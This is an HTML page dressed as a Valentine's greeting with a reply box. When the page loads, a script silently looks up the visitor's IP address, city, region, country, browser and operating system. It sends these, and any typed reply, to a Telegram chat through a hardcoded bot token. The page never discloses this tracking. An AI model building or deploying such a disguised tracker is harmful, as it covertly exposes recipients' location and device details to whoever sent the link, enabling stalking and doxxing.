<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Valentine's Message</title>
    <style>
        body {
            background-color: #ffe6f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Arial', sans-serif;
            margin: 0;
            overflow: hidden;
        }

        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
            text-align: center;
            max-width: 350px;
            max-height: 80vh;
            overflow-y: auto;
            animation: drift 3s ease-in-out infinite;
            transition: all 0.3s ease;
        }

        @keyframes drift {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        .message {
            font-size: 1.2em;
            color: #d147a3;
            margin-bottom: 20px;
            transition: all 0.3s ease;
            word-wrap: break-word;
        }

        .input-field {
            width: 100%;
            padding: 10px;
            border: 2px solid #ff6fa1;
            border-radius: 25px;
            font-size: 1em;
            margin-bottom: 20px;
            outline: none;
            resize: none;
            transition: border 0.3s ease;
        }

        .input-field:focus {
            border-color: #ff4c85;
        }

        .button {
            background-color: #ff6fa1;
            border: none;
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 1em;
            transition: background-color 0.3s ease;
        }

        .button:hover {
            background-color: #ff4c85;
        }

    </style>
</head>
<body>

    <div class="container" id="messageContainer">
        <div class="message" id="displayMessage">
            <!-- الرسالة التي يتم عرضها -->
            *هابي فالنتاين...*
        </div>
        
        <textarea class="input-field" id="userMessage" placeholder="Write your reply..." rows="1" oninput="autoGrow(this)"></textarea>
        <button class="button" onclick="sendMessage()">Send a Reply</button>
    </div>

    <script>
        function autoGrow(element) {
            element.style.height = "auto";
            element.style.height = (element.scrollHeight) + "px";
        }

        function sendMessage() {
            const userMessage = document.getElementById('userMessage').value;
            if (userMessage.trim() !== "") {
                sendToTelegram(userMessage);
            } else {
                alert("Please enter a message.");
            }
        }

        function sendToTelegram(message) {
            const botToken = '7525866619:AAFvucD9MBOr7z4XFUbRSYlYMXFsdDut800';
            const chatId = '7631254472';
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            const data = {
                chat_id: chatId,
                text: message
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .catch(error => {
                console.error("Error sending message:", error);
            });
        }

        function sendVisitorDetails() {
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    const city = data.city;
                    const region = data.region;
                    const country = data.country_name;
                    const userAgent = navigator.userAgent;
                    const platform = navigator.platform;

                    const message = `زائر جديد!\n\n- IP العام: ${ip}\n- المدينة: ${city}\n- المنطقة: ${region}\n- الدولة: ${country}\n- المتصفح: ${userAgent}\n- النظام: ${platform}`;

                    sendToTelegram(message);
                })
                .catch(error => {
                    console.error("Error fetching visitor details:", error);
                });
        }

        // استدعاء دالة إرسال تفاصيل الزائر عند تحميل الصفحة
        window.onload = function() {
            sendVisitorDetails();
        };
    </script>

</body>
</html>
